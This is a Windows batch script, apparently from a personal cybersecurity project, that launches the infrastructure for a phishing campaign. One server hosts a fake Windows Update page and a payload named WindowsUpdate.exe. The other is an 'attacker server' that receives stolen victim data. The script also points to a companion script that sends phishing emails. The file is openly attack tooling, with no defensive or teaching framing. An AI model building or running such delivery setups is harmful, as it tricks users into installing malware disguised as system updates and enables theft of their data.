@echo off
echo ========================================
echo DELIVERY TECHNIQUE 1 - START SERVERS
echo ========================================
echo.
echo This will start both required servers:
echo   1. Web Server (port 8000) - Serves phishing pages and WindowsUpdate.exe
echo   2. Attacker Server (port 5555) - Receives stolen data
echo.
pause

cd /d "%~dp0"

echo Starting Web Server on port 8000...
start "Web Server" cmd /k "C:/Users/TUF/Documents/Cyber/.venv/Scripts/python.exe -m http.server 8000"

timeout /t 2 /nobreak >nul

echo Starting Attacker Server on port 5555...
cd ..\..
start "Attacker Server" cmd /k "C:/Users/TUF/Documents/Cyber/.venv/Scripts/python.exe attacker_server.py"

echo.
echo ========================================
echo SERVERS STARTED!
echo ========================================
echo.
echo Web Server: http://192.168.5.128:8000
echo   - windows-update.html (phishing page)
echo   - WindowsUpdate.exe (payload)
echo.
echo Attacker Server: Listening on port 5555
echo   - Receives victim data
echo.
echo Next: Run auto_send_phishing.py to send emails
echo       Or open: http://192.168.5.128:8000/windows-update.html
echo.
pause
